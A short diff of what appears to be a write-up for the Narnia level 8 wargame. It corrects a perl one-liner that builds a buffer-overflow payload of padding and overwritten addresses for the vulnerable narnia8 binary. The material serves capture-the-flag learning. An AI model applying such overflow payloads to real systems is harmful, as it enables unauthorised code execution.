@@ -26,7 +26,6 @@ narnia8@gibson:/narnia$ perl -e 'printf("%8x\n", 0xffffaed7 - 12)'
 ffffaecb  
 ./narnia8 $(perl -e 'print "AAAAAAAAAAAAAAAAAAAA"') | xxd   
 
-./narnia8 $(perl -e 'print "AAAAAAAAAAAAAAAAAAAA" . "\xcb\xae\xff\xff" . "AAAA" "\xa5\xdf\xff\xff" ')    
-
+./narnia8 $(perl -e 'print "AAAAAAAAAAAAAAAAAAAA" . "\xcb\xae\xff\xff" . "AAAA" . "\xa5\xdf\xff\xff"')  
 
 
